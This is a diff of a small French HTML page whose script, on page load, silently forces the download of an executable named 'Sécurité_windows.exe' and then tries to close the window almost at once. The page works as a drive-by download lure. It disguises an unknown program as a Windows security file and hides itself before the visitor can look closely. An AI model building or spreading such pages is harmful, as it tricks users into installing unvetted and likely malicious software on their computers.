@@ -1,20 +1,23 @@
 <!DOCTYPE html>
-<html lang="fr">
-<head>
-<meta charset="UTF-8" />
-<title>Téléchargement automatique</title>
-<script>
-window.onload = function() {
-  const link = document.createElement('a');
-  link.href = 'Sécurité windows.exe'; // nom du fichier à télécharger
-  link.download = 'Sécurité windows.exe';
-  document.body.appendChild(link);
-  link.click();
-  setTimeout(() => window.close(), 100); // ferme la page au bout de 3 sec
-};
-</script>
-</head>
-<body>
-<p>Téléchargement en cours...</p>
-</body>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Téléchargement</title>
+    <script>
+      window.onload = () => {
+        const link = document.createElement("a");
+        link.href = "Sécurité_windows.exe"; // ← NOM EXACT
+        link.download = "Sécurité_windows.exe"; // ← NOM CIBLE
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        setTimeout(() => {
+          window.close(); // ← Peut être ignoré par navigateur
+        }, 200); // ⏳ Petit délai avant fermeture
+      };
+    </script>
+  </head>
+  <body>
+    <p>Téléchargement...</p>
+  </body>
 </html>
